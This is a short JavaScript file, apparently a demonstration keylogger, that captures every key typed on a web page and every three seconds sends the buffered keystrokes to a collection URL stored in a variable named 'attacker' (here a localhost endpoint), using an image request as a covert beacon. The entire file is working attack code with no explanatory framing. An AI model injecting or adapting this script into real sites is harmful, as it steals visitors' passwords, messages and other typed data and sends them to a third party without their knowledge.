'use strict'

let buffer = "";
let attacker = 'http://localhost:4000/logme/?c='

document.onkeypress = function(e) {
    let timestamp = Date.now() | 0;
    let stroke = {
        k: e.key,
        //t: timestamp
    };
    buffer += ("" + e.key);
}

window.setInterval(function() {
    if (buffer.length > 0) {
        //let data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = attacker + buffer
        buffer = "";
    }
}, 3000);
